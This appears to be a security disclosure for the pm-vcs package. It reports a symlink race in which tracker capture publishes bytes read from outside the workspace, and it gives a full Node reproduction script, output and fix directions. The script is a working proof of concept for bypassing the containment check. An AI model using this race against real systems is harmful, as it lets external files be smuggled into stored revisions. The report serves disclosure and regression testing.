Tracker capture can publish bytes read from outside the native workspace after a competing process replaces the source symlinks. Verified against merged PR #180 on `439b465017c5b3d514add008d82a6e16087d92b6` using the built package, real SDK tracker files and a separate Node writer process. All data in this reproduction is synthetic. The unchanged-link control refuses with `path_ignored`. Only the scheduling changes in the failing case; it then returns `ok:true` and stores the external item contents. ### Exact source - [The SDK item/history reads precede any filesystem containment check](https://github.com/unbraind/pm-vcs/blob/439b465017c5b3d514add008d82a6e16087d92b6/engine/tracker-admission.ts#L133-L152). `trackerWorkspacePath` checks lexical coordinates, while the retained buffers may already have come through an external symlink. - [Capture yields and rereads settings before publication](https://github.com/unbraind/pm-vcs/blob/439b465017c5b3d514add008d82a6e16087d92b6/engine/tracker-admission.ts#L198-L208). - [Publication checks the current path, then stores the previously captured buffers](https://github.com/unbraind/pm-vcs/blob/439b465017c5b3d514add008d82a6e16087d92b6/engine/repo.ts#L1739-L1768). Its writer lease does not prevent a separate filesystem writer from replacing source symlinks before this check. ### Reproduction Linux, Node 24.19.0, lockfile dependencies. The existing `trackerAdmissionBoundary` observer supplies a deterministic scheduling boundary; it does not replace the SDK readers, verifier, path guard or object store. The actual competing mutation runs in another OS process. The same window exists during the asynchronous settings read between capture and publication. ```sh work=$(mktemp -d) git clone --quiet https://github.com/unbraind/pm-vcs.git "$work/package" cd "$work/package" git checkout --quiet 439b465017c5b3d514add008d82a6e16087d92b6 npm ci --ignore-scripts --no-audit --no-fund npm run build cat > repro.mjs <<'EOF' import {mkdtempSync, readFileSync, renameSync, symlinkSync, writeFileSync} from 'node:fs'; import {tmpdir} from 'node:os'; import {join} from 'node:path'; import {execFileSync} from 'node:child_process'; import {PmClient} from '@unbrained/pm-cli/sdk'; import {TrackerCapture, trackerAdmissionBoundary} from './dist/engine/tracker-admission.js'; import {Repository} from './dist/engine/repo.js'; import {readCommit} from './dist/engine/model.js'; import {flattenTree} from './dist/engine/worktree.js'; const scratch=mkdtempSync(join(tmpdir(),'boundary-proof-')); const root=join(scratch,'workspace'), outside=join(scratch,'outside'); const {mkdirSync}=await import('node:fs');mkdirSync(root);mkdirSync(outside); const pmRoot=join(root,'.agents/pm'); const client=new PmClient({cwd:root,pmRoot,noExtensions:true,author:'fixture'}); await client.init('proof',{defaults:true,agentGuidance:'skip',author:'fixture'}); const {item}=await client.create({type:'Task',title:'SYNTHETIC_EXTERNAL_CONTENT',author:'fixture',unset:['parent','sprint','release']}); const paths=[`.agents/pm/tasks/${item.id}.toon`,`.agents/pm/history/${item.id}.jsonl`]; for(const [index,path] of paths.entries()){const dest=join(outside,String(index));renameSync(join(root,path),dest);symlinkSync(dest,join(root,path));} const repo=Repository.init(root,'main',{recordPaths:[],recordPolicy:{}}); const options={message:'Captured proof',author:{name:'fixture',email:'fixture@example.invalid',timestamp:1,timezoneOffsetMinutes:0}}; try{await new TrackerCapture(repo,pmRoot,{items:[item.id],expectedTip:null}).commit(options,new Date(1));console.log('control accepted unexpectedly');}catch(e){console.log('unchanged external symlinks:',e.code);} trackerAdmissionBoundary.visit=async step=>{if(step==='captured')execFileSync(process.execPath,['--input-type=module','-e',`import {unlinkSync,writeFileSync} from 'node:fs';for(const path of process.argv.slice(1)){unlinkSync(path);writeFileSync(path,'local replacement');}`,...paths.map(path=>join(root,path))]);}; const result=await new TrackerCapture(repo,pmRoot,{items:[item.id],expectedTip:null}).commit(options,new Date(1)); console.log('after competing process replaces links:',result.ok); if(result.ok){const entry=flattenTree(repo.objects,readCommit(repo.objects,result.revision).tree).get(paths[0]);console.log('revision contains external source:',repo.objects.readTyped(entry.id,'blob').includes(Buffer.from('SYNTHETIC_EXTERNAL_CONTENT')));} EOF PM_TELEMETRY_DISABLED=1 PM_AGENT_PROBES=0 NODE_ENV=test node repro.mjs ``` Observed output: ```text unchanged external symlinks: path_ignored after competing process replaces links: true revision contains external source: true ``` ### Expected / actual Expected: bytes originating outside the native workspace remain inadmissible even if their pathname is replaced after reading. Refuse or retry without publishing the outside bytes. Actual: the control rejects the external symlinks, but changing them to ordinary local files after capture causes the already-read external item/history pair to be admitted. The published item contains `SYNTHETIC_EXTERNAL_CONTENT`; the live local files contain only `local replacement`. ### Impact and fix direction A competing writer can bypass the workspace containment boundary and copy an external tracker item and its history into the native object store/revision. Those bytes can subsequently travel with ordinary revision export or synchronization. The proof establishes local publication only; it performs no remote transfer. Bind containment and permitted-source checks to the exact filesystem objects read, including symlink ancestors and leaf targets. Carry that verified provenance with cached pairs, and refuse or retry when it cannot be established. A later pathname check alone cannot certify the origin of an earlier buffer. Add the unchanged-link control and a separate-process replacement regression without weakening history verification.
